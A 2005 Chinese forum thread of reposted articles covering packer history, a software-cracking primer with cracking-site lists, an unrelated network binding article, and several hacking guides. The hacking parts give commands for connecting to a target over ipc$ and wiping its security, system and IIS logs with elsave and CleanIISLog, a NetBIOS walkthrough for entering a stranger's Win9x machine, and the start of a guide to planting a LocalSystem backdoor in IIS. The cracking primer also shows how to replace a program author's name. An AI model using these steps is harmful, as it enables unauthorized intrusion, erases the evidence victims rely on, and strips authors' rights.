　　 最早提出“壳”这个概念的，据我所知，应该是当年推出脱壳软件 RCOPY 3 的作者熊焰先生。在几年前的 DOS 时代，“壳”一般都是指磁盘加密软件的段加密程序，可能是那时侯的加密软件还刚起步不久吧，所以大多数的加密软件（加壳软件）所生成的“成品”在“壳”和需要加密的程序之间总有一条比较明显的“分界线”。有经验的人可以在跟踪软件的运行以后找出这条分界线来，至于这样有什么用这个问题，就不用我多说了。但毕竟在当时，甚至现在这样的人也不是很多，所以当 RCOPY3 这个可以很容易就找出“分界线”，并可以方便的去掉“壳”的软件推出以后，立即就受到了很多人的注意。老实说，这个我当年在《电脑》杂志看到广告，在广州电脑城看到标着999元的软件，在当时来说，的确是有很多全新的构思，单内存生成 EXE 可执行文件这项，就应该是世界首创了。但它的思路在程序的表现上我认为还有很多可以改进的地方（虽然后来出现了可以加强其功力的 RO97），这个想法也在后来和作者的面谈中得到了证实。在这以后，同类型的软件想雨后春笋一般冒出来，记得住名字的就有： UNKEY、MSCOPY、UNALL .... 等等，但很多的软件都把磁盘解密当成了主攻方向，忽略了其它方面，当然这也为以后的“密界克星”“解密机器”等软件打下了基础，这另外的分支就不多祥谈了，相信机龄大一点的朋友都应该看过当时的广告了。 

　　 解密（脱壳）技术的进步促进、推动了当时的加密（加壳）技术的发展。LOCK95和 BITLOK 等所谓的“壳中带籽”加密程序纷纷出笼，真是各出奇谋，把小小的软盘也折腾的够辛苦的了。正在国内的加壳软件和脱壳软件较量得正火红的时候，国外的“壳”类软件早已经发展到像 LZEXE 之类的压缩壳了。这类软件说穿了其实就是一个标准的加壳软件，它把 EXE 文件压缩了以后，再在文件上加上一层在软件被执行的时候自动把文件解压缩的“壳”来达到压缩 EXE 文件的目的。接着，这类软件也越来越多， PKEXE、AINEXE、UCEXE 和后来被很多人认识的 WWPACK 都属于这类软件，但奇怪的是，当时我看不到一个国产的同类软件。 

　　 过了一段时间，可能是国外淘汰了磁盘加密转向使用软件序列号的加密方法吧，保护 EXE 文件不被动态跟踪和静态反编译就显得非常重要了。所以专门实现这样功能的加壳程序便诞生了。 MESS 、CRACKSTOP、HACKSTOP、TRAP、UPS 等等都是比较有名气的本类软件代表，当然，还有到现在还是数一数二的，由中国台湾同胞所写的 FSE 。其实以我的观点来看，这样的软件才能算是正宗的加壳软件。 

　　在以上这些加壳软件的不断升级较劲中，很多软件都把比较“极端”技术用了上去，因为在这个时候 DOS 已经可以说是给众高手们玩弄在股掌之间了，什么保护模式、反 SICE 、逆指令等等。相对来说，在那段时间里发表的很多国外脱壳程序，根本就不能对付这么多的加壳大军，什么 UPC、TEU 等等都纷纷成为必防的对象，成绩比较理想的就只有 CUP386 了，反观国内，这段时间里也没了这方面的“矛盾斗争”。加壳软件门挥军直捣各处要岗重地，直到在我国遇到了 TR 这个铜墙铁壁以后，才纷纷败下阵来各谋对策，但这已经是一年多以后的事情了。我常想，如果 TR 能早两年“出生”的话，成就肯定比现在大得多，甚至盖过 SICE 也有可能。TR 发表的时候 WIN95 的流行已经成为事实，DOS 还有多少的空间，大家心里都清楚。但话又说回来， TR 的确是个好软件，比起当年的 RCOPY3 有过之而无不及，同时也证明了我们中国的 CRACK 实力（虽然有点过时）。这个时候，前面提到过的 FSE 凭着强劲的实力也渐渐的浮出了水面，独领风骚。其时已经是 1997 年年底了，我也走完了学生“旅程”。工作后在CFIDO 的 CRACK 区认识了 Ding-Boy ，不久 CRACK 区关了，我从此迷上了 INTERNET，并于98年6月建起了一个专门介绍“壳”的站台： http://topage.126.com ，放上了我所收集的所有“壳”类软件。在这段时间里，各种“壳”类软件也在不段的升级换代，但都没什么太大的进展，差不多就是 TR 和众加壳软件的版本数字之争而已。 

 1998年8月，一个名为 UNSEC （揭秘）的脱壳软件发表了，它号称可以脱掉98年8月以前发表的所有壳。我测试之后，觉得并没传闻中的那么厉害，特别是兼容性更是令我不想再碰它。 Ding-Boy 给这个软件的作者提了很多建议，但寄去的 EMIAL 有如泥牛入海，可能是一怒之下吧，不久 Ding-Boy 的 BW （冲击波）就诞生了。这个使用内存一次定位生成 EXE 文件（后来放弃了）的脱壳软件，在我的站台公开后，得到了很多朋友们的肯定。要知道，从RCOPY 3 开始，绝大部分的脱壳软件都是要两次运行目标程序来确定 EXE 的重定位数据的。BW 的这一特点虽然有兼容性的问题，但也树立了自己的风格、特色。经过几个月的改善， BW 升级到了 2.0 版本，这个版本的推出可以说是 BW 的转折点，因为它已经是一个成熟、稳定脱壳软件了，它可以对付当时（现在）大多数的壳，包括当时最新的 FSE 0.6 等。更重要的是这个版本把选择壳的和软件“分界线”这个最令新手头疼的步骤简化到不能再简化的地步，使更多的朋友接受了它。另外，能加强 BW 功力的 CI 模式也是其它脱壳软件没有的东西。最近，BW 发表了最新的 2.5 BETA2 版本，增强了一些方面的功能，因它竟然可以脱掉号称最厉害的磁盘加密工具 LOCKKING 2.0 的加密壳，因而进一步奠定了它在“脱壳界”的地位。说到最新，就不能不提 GTR、LTR、EDUMP、ADUMP、UPS、UPX、APACK 这几个国外的好软件了，它们每个都有自己的特色，可以说都是当今各类“壳”中的最新代表了。（这些软件和详细介绍请到我的主页查阅） 

　　由于 WINDOWS 3.1 只是基于 DOS 下的一个图形外壳，所以在这个平台下的“壳”类软件很少，见过的就只有像 PACKWIN 等几个有限的压缩工具，终难成气候。 

　　 可能是 MICROSOFT 保留了 WIN95 的很多技术上的秘密吧，所以即便是 WIN95 已经推出了 3 年多的时间，也没见过在其上面运行的“壳”类软件。直到 98 年的中期，这样的软件才迟迟的出现，而这个时候 WIN98 也发表了有一段日子了。应该是有 DOS 下的经验吧，这类的软件不发表由自可，一发表就一大批地的冲了出来。先是加壳类的软件如： BJFNT、PELOCKNT 等，它们的出现，使暴露了 3 年多的 WIN95 下的 PE 格式 EXE 文件得到了很好的保护。大家都应该知道现在很多 WIN95 下的软件都是用注册码的方法来区分、确定合法与非法用户的吧，有了这类加壳软件，这种注册方法的安全性提高了不少，如果大家也有自己编的 WIN95 程序，就一定要多留意一下本类软件了。接着出现的就是压缩软件了，因为 WIN95 下运行的 EXE 文件“体积”一般都比较大，所以它的实用价值比起 DOS 下的压缩软件要大很多，这类的软件也很多，早些时候的 VBOX、PEPACK、PETITE 和最近才发表的 ASPACK、UPX 都是其中的佼佼者。在 DOS 下很流行的压缩软件 WWPACK 的作者也推出了对应 WIN95 版本的 WWPACK32，由于性能并不是十分的突出，所以用的人也不太多。由于压缩软件其实也是间接给软件加了壳，所以用它们来处理 EXE 也是很多软件作者喜欢做的事情，最近新发表的很多软件里都可以看到这些加壳、加压缩软件的名字了。有加壳就一定会有脱壳的，在 WIN95 下当然也不例外，但由于编这类软件比编加壳软件要难得多，所以到目前为止，我认为就只有 PROCDUMP 这个软件能称为通用脱壳软件了，它可以对付现在大多数的加壳、压缩软件所加的壳，的确是一个难得的精品。其它的脱壳软件多是专门针对某某加壳软件而编，虽然针对性强、效果好，但收集麻烦，而且这样的脱壳软件也不多。前些时候 TR 作者也顺应潮流发表了 TR 的 WIN95 版本： TRW ，由现在的版本来看可以对付的壳还不多，有待改进。 

　　BW 的作者 Ding-Boy 最新发表了一个 WIN95 的 EXE 加壳软件 DBPE 。虽然它还不太成熟，但它可以为软件加上使用日期限制这个功能是其它加壳软件所没有的，或者以后的加壳软件真的会是像他说的那样可以：加壳和压缩并重、并施；随意加使用日期；加上注册码；加软件狗（磁盘）保护；加硬件序列号判别；加... 。 




一.壳的概念 
作者编好软件后,编译成exe可执行文件 
1.有一些版权信息需要保护起来,不想让别人随便改动,如作者的姓名等 
2.需要把程序搞的小一点,从而方便使用 
于是,需要用到一些软件,他们能将exe可执行文件压缩,实现上述两个功能,这些软件称为加壳软件或压缩软件. 
它不同于一般的winzip,winrar等压缩软件.它是压缩exe可执行文件的,压缩后的文件可以直接运行. 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:06pm 

壳（下） 


二.加壳软件 
最常见的加壳软件ASPACK ,UPX,PEcompact 
不常用的加壳软件WWPACK32；PE-PACK ；PETITE ；NEOLITE 

三.侦测壳和软件所用编写语言的软件 
1.侦测壳的软件fileinfo.exe 简称fi.exe(侦测壳的能力极强)使用方法: 

第一种：待侦测壳的软件(如aa.exe)和fi.exe位于同一目录下,执行 
windows起始菜单的运行,键入fi aa 

第二种：待侦测壳的软件(如aa.exe)和fi.exe位于同一目录下,将aa的图标拖到fi的图标上 

2.侦测壳和软件所用编写语言的软件language.exe(两个功能合为一体,很棒)推荐language2000中文版,我的 

主页可下载傻瓜式软件,运行后选取待侦测壳的软件即可(open) 

3.软件常用编写语言Delphi,VisualBasic(VB)---最难破,VisualC(VC) 


脱壳 

拿到一个软件,我们首先根据第一课的内容。侦测它的壳,然后我们要把它的壳脱去,还原它的本来面目.若它没有加壳,就省事不用脱壳了. 

一.脱壳软件 
unaspack,caspr,upx,unpecompact,procdump 
二.使用方法 
(一)aspack壳 脱壳可用unaspack或caspr 
1.unaspack我的主页可下载中文版 
使用方法类似lanuage 
傻瓜式软件,运行后选取待脱壳的软件即可.缺点：只能脱aspack早些时候版本的壳,不能脱高版本的壳 
2.caspr 
第一种：待脱壳的软件(如aa.exe)和caspr.exe位于同一目录下,执行 
windows起始菜单的运行,键入 caspr aa.exe 
脱壳后的文件为aa.ex_,删掉原来的aa.exe,将aa.ex_改名为aa.exe即可 
使用方法类似fi优点：可以脱aspack任何版本的壳，脱壳能力极强 缺点：Dos界面 
第二种：将aa.exe的图标拖到caspr.exe的图标上 
***若已侦测出是aspack壳,用unaspack脱壳出错，说明是aspack高版本的壳，用caspr脱即可 

(二)upx壳 脱壳可用upx 
待脱壳的软件(如aa.exe)和upx.exe位于同一目录下,执行windows起始菜单的运行,键入upx -d aa.exe 

(三)PEcompact壳 脱壳用unpecompact 
使用方法类似lanuage。傻瓜式软件,运行后选取待脱壳的软件即可 

(四)procdump 万能脱壳但不精,一般不要用 我的主页可下载中文版 
使用方法:运行后,先指定壳的名称,再选定欲脱壳软件,确定即可 
脱壳后的文件大于原文件。由于脱壳软件很成熟,手动脱壳一般用不到,不作介绍. 

三. exe可执行文件编辑软件ultraedit 
下载它的汉化版本,它的注册机可从网上搜到 
ultraedit打开一个中文软件,若加壳,许多汉字不能被认出 
ultraedit打开一个中文软件,若未加壳或已经脱壳,许多汉字能被认出 
ultraedit可用来检验壳是否脱掉,以后它的用处还很多,请熟练掌握 
例如,可用它的替换功能替换作者的姓名为你的姓名 
注意字节必须相等,两个汉字替两个,三个替三个,不足处在ultraedit编辑器左边用00补 


四.常用资源 
1.破解工具站点(以上工具从这里找) 
www.exetools.com 
www.pediy.com 
http://www.programmerstools.com(guowai/ 
www.cracknow.com 
2.软件站点 
www.newhua.com 
www.hktk.com 
http://www.esoftware.com.cn/ (强烈推荐,这里能找到软件的各个版本，尤其是旧版本。以后破解例子中所用软件一般在这儿都能找到） 
www.shareware.net.cn 
www.csdn.net 

五.国外破解站点 

-----------破解教程类:--------- 
1. +HCU Academy - http://Tsehp(dot)cjb(dot)net (Academy - Best) 

2. The Krobar Collection: http://Krobar.cjb.net (Recommended) 

3. CoDe_InSiDe - http://codeinside.cjb.net (Mine/CoDe's tutorials) 

4. Eternal_Bliss - http://ebliss.cjb.net (Visual-Basic) 

5. +Sandman - http://www.idca.com/~thesandman/index2.html (Best - Recommended) 

6. Icezelion's Win32Asm - http:/win32asm.cjb.net (Coding) 

7. tHE Egoiste - http://egoiste.da.ru (Great page with Crypto Stuff) 

8. CrackMe's Page - http://crackmes.cjb.net (Recommended, dl all CrackMe from here) 


--------破解工具类:--------- 
1. Programmers Tools - http://protools.cjb.net (Best) 

2. Play Tools - http://playtools.cjb.net (Great) 

3. EXE Tools - http://exetools.cjb.net/ (Average) 

4. Aaron's Tools - http://mud.sz.jsinfo.net/per/aaron/index.htm (Average) 

5. http://ProcDump32.cjb.net 

6. Freak2freak.cjb.net 

7. www.sysinternals.com (FileMon) 

8. http://rpi.net.au/~ajohnson/resourcehacker 

9. http://muaddib.immortaldescendants.org 

10.http://frog.fsn.net (May be down) 


-----------破解组织类:----------- 
1. PGC - http://www.pgc-force.com 

2. The Millenium Group - http://tmg.da.ru/ (Keygen Factory :-) 

3. HellForge - http://www.hellforge.org/ 

4. The Cracking Answer - http://tca2k.da.ru/ 

5. Immortal Descendants - http://www.immortaldescendants.org 

6. TrickSoft - http://emc2k.com/tricksoft/ 

7. DOOM - http://deadlyzone.virtualave.net/Html/load.htm 

8. http://www.suddendischarge.com/ 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:06pm 

简单黑客工具使用 


1.小榕的elsave清除日志的使用: 

　　先用ipc$管道进行连接:net use \\ip\ipc$ "password" /user:"" 

　　清除目标系统的应用程序日志: 

　　elsave -s \\ip -l "application" -C 

　　清除目标系统的系统日志: 

　　elsave -s \\ip -l "system"" -C 

　　清除目标系统的安全日志: 

　　elsave -s \\ip -l "security" -C 

　　 

　　2.windows2000日志的清除: 

　　www的日志一般都在%winsystem%\system32\logfiles\w3svc1下面,包括www日志和ftp日志,一般先停止www服务后在删除:net stop w3svc,然后将你留下了ip的日志删除,你也可以修改日志.wwww日志在w3svc1下面,ftp日志在msftpsvc下面,每个日志都是以:exXXXXXX.log为命名的,xxxxxx代表日期. 

　　win2000中的其他一些日志: 

　　安全日志:%winsystem%\system32\config\Secevent.evt 

　　应用程序日志:%winsystem%\system32\config\AppEvent.evt 

　　系统日志:%winsystem%\system32\config\SysEvent.evt 

　　IIS的FTP日志:%winsystem%\system32\logfiles\msftpsvc1\,默认每天一个日志 

　　IIS的www日志:%winsystem%\system32\logfiles\w3svc1\ 默认每天一个日志 

　　Scheduler服务日志:%winsystem%\schedlgu.txt 

　　注册表所在项目: 

　　[HKLM]\system\CurrentControlSet\Services\Eventlog 

　　Schedluler服务注册表所在项目: 

　　[HKLM]\SOFTWARE\Microsoft\SchedulingAgent 

　　如果日志被从新定位,路径在注册表里面有记录. 

　　 
清除日志 

　　清除日志必须先停掉相关的服务后才能进行: 

　　www和ftp日志必须想停w3svc: net stop w3svc 

　　然后就可在相关日志目录下面把你想要删除的日志删除. 

　　Scheduler服务日志必须想停止:Task Scheduler服务才能删除日志: net stop "Task Scheduler" 

　　系统,安全,应用程序等日志相关的服务是:Eventlog,但是该项目是无法直接停止的,我们可以先用ipc$连接过去,然后打开"控制面板"中的计算机管理中连接远程计算机,从里面删除相关的内容,但是如果日记比较多的话,可能需要比较多的时间,而且对网速要求比较高.但是,我们可以利用一个工具:小榕的elsave来删除.方法如上面第一项. 

　　也可以利用小榕写的一个工具:CleanIISLog来自动清除日志,用法: 

　　cleaniislog [logfile]　[.] [cleanIP]　. 

　　说明: 清除的日志文件,.代表所有 清除的日志中哪个IP地址的记录,.代表所有IP记录 

　　举例:cleaniislog . 127.0.0.1 

　　A.可以清除指定的的IP连接记录，保留其他IP记录。 

　　B.当清除成功后，CleanIISLog会在系统日志中将本身的运行记录清除。 

　　用法: CleanIISLog 　<.> 　<.> 

　　: 指定要处理的日志文件，如果指定为“.”，则处理所有的日志文件注意：处理所有日志文件需要很长的时间）。 

　　: 指定要清除的IP记录，如果指定为“.”，则清除所有的IP记录（不推荐这样做）。 

　　CleanIISLog只能在本地运行，而且必须具有Administrators权限。
知道对方IP入侵别人的电脑
黑客已经成为一种文化，很多人想成为黑客，他们偶尔学到了几种小花招，总喜欢拿别人开玩笑，搞些恶作剧。其实黑客的最高境界在于防守，不在于进攻。所谓明枪易躲暗箭难防，要防住他人所有的进攻，肯定需要懂得比对方更多的系统知识，了解更多的系统漏洞，及如何弥补漏洞。 现在满天都是黑客教程，但真正有用的不多，下面介绍一种WIN9X下的入侵方法: 1.取得对方IP地址如XX.XX.XX.XX，方法太多不细讲了。 2.判断对方上网的地点，开个DOS窗口键入 TRACERT XX.XX.XX.XX 第4和第5行反映的信息既是对方的上网地点。 3.得到对方电脑的名称，开个DOS窗口键入 NBTSTAT -A XX.XX.XX.XX 第一行是对方电脑名称 第二行是对方电脑所在工作组 第三行是对方电脑的说明 4.在Windows目录下有一文件名为LMHOSTS.SAM，将其改名为LMHOSTS，删除其内容，将对方的IP及电脑名按以下格式写入文件： XX.XX.XX.XX 电脑名 5.开DOS窗口键入 NBTSTAT -R 6.在开始-查找-电脑中输入对方电脑名，出现对方电脑点击即可进入。 以上方法请不要乱用，本人对你用上面的方法所惹出的麻烦概不负责，请慎重。 对付上面进攻的最好办法就是隐藏你的IP地址。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:06pm 

浅谈绑定之应用 


目前以太网已经普遍应用于运营领域，如小区接入、校园网等等。但由于以太网本身的开放性、共享性和弱管理性，采用以太网接入在用户管理和安全管理上必然存在诸多隐患。业界厂商都在寻找相应的解决方案以适应市场需求，绑定是目前普遍宣传和被应用的功能，如常见的端口绑定、MAC绑定、IP绑定、动态绑定、静态绑定等。其根本目的是要实现用户的唯一性确定，从而实现对以太网用户的管理。 

　　一、绑定的由来 

　　绑定的英文词是BINDING，其含义是将两个或多个实体强制性的关联在一起。一个大家比较熟悉的例子，就是配置网卡时，将网络协议与网卡驱动绑定在一起。其实在接入认证时，匹配用户名和密码，也是一种绑定，只有用户名存在并且密码匹配成功，才认为是合法用户。在这里，用户名已经可以唯一标识某个用户，与对应密码进行一一绑定。 

　　二、绑定的分类 

　　从绑定的实现机制上，可以分为AAA（服务器）有关绑定和AAA无关绑定；从绑定的时机上，可以分为静态绑定和动态绑定。 

　　AAA是用户信息数据库，所以AAA有关绑定以用户信息为核心，认证时设备上传绑定的相关属性（端口、VLAN、MAC、IP等），AAA收到后与本地保存的用户信息匹配，匹配成功则允许用户上网，否则拒绝上网请求。 

　　AAA无关绑定完全由接入设备实现。接入设备（如Lanswitch）上没有用户信息，所以AAA无关绑定只能以端口为核心，在端口上可以配置本端口可以接入的MAC（或IP）地址列表，只有其MAC地址属于此列表中的计算机才能够从该端口接入网络。 

　　静态绑定是在用户接入网络前静态配置绑定的相关信息，用户接入认证时，匹配这些信息，只有匹配成功才能接入。 

　　动态绑定的相关信息不是静态配置的，而是接入时才动态保存到接入设备上，接入网络后不允许用户再修改这些信息，一旦修改，则强制用户下线。 

　　AAA相关绑定一般都是静态绑定，动态绑定一般都是在接入设备上实现的。接入设备离最终用户最近，用户所有的认证数据流和业务数据流都必须经过接入设备，只有认证数据流经过AAA，所以接入设备可以最容易最及时发现相关绑定信息的变化，也方便采取强制用户下线等处理措施。另外，网络中AAA一般只有一台，集中管理，接入设备却有很多，由分散的接入设备监视用户绑定信息的变化，可以减轻AAA的负担。 

　　三、绑定的应用模式 

　　除了常用的用户名与密码绑定外，可以用于绑定的属性主要有：端口、VLAN、MAC地址和IP地址。这些属性的特性不同，其绑定的应用模式也有较大差别。 

　　1、IP地址绑定 

　　1）解释 

　　按照前边的定义标准，IP地址绑定可以分为AAA有关IP地址绑定、AAA无关IP地址绑定、IP地址静态绑定和IP地址动态绑定。 

　　AAA有关IP地址绑定：在AAA上保存用户固定分配的IP地址，用户认证时，接入设备上传用户机器静态配置的IP地址，AAA将设备上传IP地址与本地保存IP地址比较，只有相等才允许接入。 

　　AAA无关IP地址绑定：在接入设备上配置某个端口只能允许哪些IP地址接入，一个端口可以对应一个IP地址，也可以对应多个，用户访问网络时，只有源IP地址在允许的范围内，才可以接入。 

　　IP地址静态绑定：接入网络时检查用户的IP地址是否合法。 

　　IP地址动态绑定：用户上网过程中，如更改了自己的IP地址，接入设备能够获取到，并禁止用户继续上网 




2）应用 

　　教育网中，学生经常改变自己的IP地址，学校里IP地址冲突的问题比较严重，各学校网络中心承受的压力很大，迫切需要限制学生不能随便更改IP地址。可以采用以下方法做到用户名和IP地址的一一对应，解决IP地址问题。 

　　如有DHCP Server，可以使用IP地址动态绑定，限制用户上网过程中更改IP地址。此时需要接入设备限制用户只能通过DHCP获取IP地址，静态配置的IP地址无效。如没有DHCP Server，可以使用AAA有关IP地址绑定和IP地址动态绑定相结合方式，限制用户只能使用固定IP地址接入，接入后不允许用户再修改IP地址。通过DHCP Server分配IP地址时，一般都可以为某个MAC地址分配固定的IP地址，再与AAA有关MAC地址绑定配合，变相的做到了用户和IP地址的一一对应。 

　　2、MAC地址绑定 

　　1）解释 

　　与IP地址绑定类似，MAC地址绑定也可以分为AAA有关MAC地址绑定和AAA无关MAC地址绑定；MAC地址静态绑定和MAC地址动态绑定。 

　　由于修改了MAC地址之后，必须重新启动网卡才能有效，重新启动网卡就意味着重新认证，所以MAC地址动态绑定意义不大。 

　　2）应用 

　　AAA有关MAC地址绑定在政务网或园区网中应用比较多，将用户名与机器网卡的MAC地址绑定起来，限制用户只能在固定的机器上上网，主要是为了安全和防止帐号盗用。但由于MAC地址也是可以修改的，所以这个方法还存在一些漏洞的。 

　　3、端口绑定 

　　1）解释 

　　端口的相关信息包含接入设备的IP地址和端口号。 

　　设备IP和端口号对最终用户都是不可见的，最终用户也无法修改端口信息，用户更换端口后，一般都需要重新认证，所以端口动态绑定的意义不大。由于AAA无关绑定是以端口为核心了，所以AAA无关端口绑定也没有意义。 

　　有意义的端口绑定主要是AAA有关端口绑定和端口静态绑定。 

　　2）应用 

　　AAA有关端口绑定主要用于政务网、园区网和运营商网络，从而限制用户只能在特定的端口上接入。 

　　4、VLAN绑定 

　　1）解释 

　　与端口绑定类似，VLAN相关信息也配置在接入设备上，最终用户无法修改，所以，VLAN动态绑定意义不大。对于AAA无关VLAN绑定，如只将端口与VLAN ID绑定在一起，那么如果用户自己连一个HUB，就会出现一旦此HUB上的一个用户认证通过，其他用户也可以上网的情况，造成网络接入不可控，所以一般不会单独使用AAA无关的VLAN绑定。 

　　常用的VLAN绑定是AAA有关VLAN绑定和VLAN静态绑定。 



　2）应用 

　　如网络接入采用二层结构，上层是三层交换机，下层是二层交换机，认证点在三层交换机上，这种情况下，仅靠端口绑定只能限制用户所属的三层交换机端口，限制范围太大，无法限制用户所属的二层交换机端口。 

　　使用AAA有关VLAN绑定和VLAN静态绑定就可以解决这个问题。 

　　分别为二层交换机的每个下行端口各自设置不同的VLAN ID，二层交换机上行端口设置为VLAN透传，就产生了一个三层交换机端口对应多个VLAN ID的情况，每个VLAN ID对应一个二层交换机的端口。用户认证时，三层交换机将VLAN信息上传到AAA，AAA与预先设置的信息匹配，根据匹配成功与否决定是否允许用户接入。 

　　此外，用户认证时，可以由AAA将用户所属的VLAN ID随认证响应报文下发到接入设备，这是另外一个角度的功能。虽然无法限制用户只能通过特定的二层交换机端口上网，但是可以限制用户无论从那个端口接入，使用的都是用一个VLAN ID。这样做的意义在于，一般的DHCP Server都可以根据VLAN划分地址池，用户无论在哪个位置上网，都会从相同的地址池中分配IP地址。出口路由器上可以根据源IP地址制定相应的访问权限。综合所有这些，变相的实现了在出口路由器上根据用户名制定访问权限的功能。 

　　5、其它说明 

　　标准的802.1x认证，只能控制接入端口的打开和关闭，如某个端口下挂了一个HUB，则只要HUB上有一个用户认证通过，该端口就处于打开状态，此HUB下的其他用户也都可以上网。为了解决这个问题，出现了基于MAC地址的认证，某个用户认证通过后，接入设备就将此用户的MAC地址记录下来，接入设备只允许所记录MAC地址发送的报文通过，其它MAC地址的报文一律拒绝。 

　　为了提高安全性，接入设备除了记录用户的MAC地址外，还记录了用户的IP地址、VLAN ID等，收到的报文中，只要MAC地址、IP地址和VLAN ID任何一个与接入设备上保存的信息匹配不上，就不允许此报文通过。有的场合，也将这种方式称为接入设备的“MAC地址+IP地址+VLAN ID”绑定功能。功能上与前边的AAA无关的动态绑定比较类似，只是用途和目的不同。 

　　四、业界厂商产品对绑定的支持 

　　以上的常用绑定功能业界厂商都普遍支持，一些厂商还进行了更有特色的功能开发，如华为提供的以下增强功能： 

　　1、绑定信息自学习 

　　1）MAC地址自动学习 

　　配置AAA相关MAC地址绑定功能时，MAC很长，难以记忆，输入时也经常出错，一旦MAC地址输入错误，就会造成用户无法上网，大大增加了AAA系统管理员的工作量。CAMS实现了MAC地址自动学习功能，可以学习用户第一次上网的MAC地址，并自动与用户绑定，既减少了工作量，又不会出错。以后用户MAC地址变更时，系统管理员将用户绑定的MAC地址清空，CAMS会再次自动学习用户MAC地址。 

　　2）IP地址自动学习 

　　与MAC地址自动学习类似。 

　　2、一对多绑定 

　　1）IP地址一对多绑定 

　　用户可以绑定不只一个IP地址，而是可以绑定一个连续的地址段。这个功能主要应用于校园网中，一个教研室一般都会分配一个连续的地址段，教研室的每个用户都可以自由使用该地址段中的任何一个IP地址。教研室内部的网络结构和IP地址经常变化，将用户和教研室的整个地址段绑定后，可以由各教研室自己分配和管理内部IP地址，既不会因教研室内部IP地址分配问题影响整个校园网的正常运转，又可以大大减少AAA系统管理员的工作量。 

　　2）端口一对多绑定 

　　与IP地址一对多绑定类似，也存在端口一对多绑定的问题。CAMS将端口信息分成以下几个部分：接入设备IP地址-槽号-子槽号-端口号-VLAN ID，这几个部分按照范围由广到窄的顺序。任何一个部分都可以使用通配符，表示不限制具体数值。比如，端口号部分输入通配符，就表示将用户绑定在某台交换机下的某个槽号的某个子槽号的所有端口上，可以从其中的任何一个端口接入。 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:07pm 

永远的后门 

IIS是比较流行的www服务器，设置不当漏洞就很多。入侵iis服务器后留下后门，以后就可以随时控制。一般的后门程序都是打开一个特殊的端口来监听，比如有nc,ntlm,rnc等等都是以一种类telnet的方式在服务器端监听远程的连接控制。不过一个比较防范严密的www站点（他们的管理员吃了苦头后）一般通过防火墙对端口进行限制，这样除了管理员开的端口外，其他端口就不能连接了。但是80端口是不可能关闭的（如果管理员没有吃错药）。那么我们可以通过在80端口留后门，来开启永远的后门。 


如果你对此有情趣，跟我来........... 
当IIS启动CGI应用程序时，缺省用CreateProcessAsUser API来创建该CGI的新Process,该程序的安全上下文就由启动该CGI的用户决定。一般匿名用户都映射到IUSR_computername这个账号，当然可以由管理员改为其他的用户。或者由浏览器提供一个合法的用户。两者的用户的权限都是比较低，可能都属于guest组的成员。其实我们可以修改iis开启CGI的方式，来提高权限。我们来看iis主进程本身是运行在localsystem账号下的，所以我们就可以得到最高localsystem的权限。 
入侵web服务器后，一般都可以绑定一个cmd到一个端口来远程控制该服务器。这时可以有GUI的远程控制，比如3389，或者类telnet text方式的控制，比如rnc。nc肯定是可以用的,其实这也足够了。 
1. telnet到服务器 

2. cscript.exe adsutil.vbs enum w3svc/1/root 
KeyType : (STRING) "IIsWebVirtualDir" 
AppRoot : (STRING) "/LM/W3SVC/1/ROOT" 
AppFriendlyName : (STRING) "默认应用程序" 
AppIsolated : (INTEGER) 2 
AccessRead : (BOOLEAN) True 
AccessWrite : (BOOLEAN) False 
AccessExecute : (BOOLEAN) False 
AccessScript : (BOOLEAN) True 
AccessSource : (BOOLEAN) False 
AccessNoRemoteRead : (BOOLEAN) False 
AccessNoRemoteWrite : (BOOLEAN) False 
AccessNoRemoteExecute : (BOOLEAN) False 
AccessNoRemoteScript : (BOOLEAN) False 
HttpErrors : (LIST) (32 Items) 
"400,*,FILE,C:\WINNT\help\iisHelp\common\400.htm" 
"401,1,FILE,C:\WINNT\help\iisHelp\common\401-1.htm" 
"401,2,FILE,C:\WINNT\help\iisHelp\common\401-2.htm" 
"401,3,FILE,C:\WINNT\help\iisHelp\common\401-3.htm" 
"401,4,FILE,C:\WINNT\help\iisHelp\common\401-4.htm" 
"401,5,FILE,C:\WINNT\help\iisHelp\common\401-5.htm" 
"403,1,FILE,C:\WINNT\help\iisHelp\common\403-1.htm" 
"403,2,FILE,C:\WINNT\help\iisHelp\common\403-2.htm" 
"403,3,FILE,C:\WINNT\help\iisHelp\common\403-3.htm" 
"403,4,FILE,C:\WINNT\help\iisHelp\common\403-4.htm" 
"403,5,FILE,C:\WINNT\help\iisHelp\common\403-5.htm" 
"403,6,FILE,C:\WINNT\help\iisHelp\common\403-6.htm" 
"403,7,FILE,C:\WINNT\help\iisHelp\common\403-7.htm" 
"403,8,FILE,C:\WINNT\help\iisHelp\common\403-8.htm" 
"403,9,FILE,C:\WINNT\help\iisHelp\common\403-9.htm" 
"403,10,FILE,C:\WINNT\help\iisHelp\common\403-10.htm" 
"403,11,FILE,C:\WINNT\help\iisHelp\common\403-11.htm" 
"403,12,FILE,C:\WINNT\help\iisHelp\common\403-12.htm" 
"403,13,FILE,C:\WINNT\help\iisHelp\common\403-13.htm" 
"403,15,FILE,C:\WINNT\help\iisHelp\common\403-15.htm" 
"403,16,FILE,C:\WINNT\help\iisHelp\common\403-16.htm" 
"403,17,FILE,C:\WINNT\help\iisHelp\common\403-17.htm" 
"404,*,FILE,C:\WINNT\help\iisHelp\common\404b.htm" 
"405,*,FILE,C:\WINNT\help\iisHelp\common\405.htm" 
"406,*,FILE,C:\WINNT\help\iisHelp\common\406.htm" 
"407,*,FILE,C:\WINNT\help\iisHelp\common\407.htm" 
"412,*,FILE,C:\WINNT\help\iisHelp\common\412.htm" 
"414,*,FILE,C:\WINNT\help\iisHelp\common\414.htm" 
"500,12,FILE,C:\WINNT\help\iisHelp\common\500-12.htm" 
"500,13,FILE,C:\WINNT\help\iisHelp\common\500-13.htm" 
"500,15,FILE,C:\WINNT\help\iisHelp\common\500-15.htm" 
"500,100,URL,/iisHelp/common/500-100.asp" 

FrontPageWeb : (BOOLEAN) True 
Path : (STRING) "c:\inetpub\wwwroot" 
AccessFlags : (INTEGER) 513 
[/w3svc/1/root/localstart.asp] 
[/w3svc/1/root/_vti_pvt] 
[/w3svc/1/root/_vti_log] 
[/w3svc/1/root/_private] 
[/w3svc/1/root/_vti_txt] 
[/w3svc/1/root/_vti_script] 
[/w3svc/1/root/_vti_cnf] 
[/w3svc/1/root/_vti_bin] 
